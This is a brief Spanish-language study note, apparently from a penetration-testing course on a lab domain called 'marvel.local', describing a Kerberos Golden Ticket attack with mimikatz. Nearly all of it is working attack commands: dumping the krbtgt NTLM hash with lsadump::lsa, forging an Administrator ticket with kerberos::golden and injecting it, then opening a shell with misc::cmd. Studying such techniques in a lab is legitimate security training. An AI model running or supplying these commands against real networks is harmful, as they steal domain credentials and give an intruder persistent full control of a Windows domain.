


## mimikatz

lsadump::lsa /inject /name:krbtgt


abrimos notepad y copiamos el SID del dominio y el hash NTLM


![[Pasted image 20250604091131.png]]![[Pasted image 20250604091138.png]]

escribimos en mimikatz

```bash
kerberos::golden /User:Administrador /domain:marvel.local /sid:S-1-5-21-301.... /krbtgt <NTLMHASH> /id:500 /ptt
```

```
misc::cmd
```

